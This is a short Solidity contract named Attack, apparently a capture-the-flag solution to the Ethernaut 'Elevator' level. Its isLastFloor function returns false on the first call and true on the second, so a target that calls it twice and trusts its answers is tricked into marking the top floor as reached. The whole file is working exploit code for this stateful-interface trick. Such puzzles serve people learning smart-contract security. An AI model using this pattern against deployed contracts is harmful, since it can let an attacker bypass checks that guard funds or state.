// SPDX-License-Identifeir: MIT

pragma solidity ^0.8.0;

interface Elevator {
    function goTo(uint _floor) external;
}

contract Attack {

    Elevator private target;
    bool isFirstCall = true;


    constructor(address targetAddr) {
        target = Elevator(targetAddr);
    }

    function attack() public {
        target.goTo(0);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (isFirstCall) {
            isFirstCall = false;
            return false; // the first call should return false
        } else {
            return true; // the second call should return true
        }
    }
}
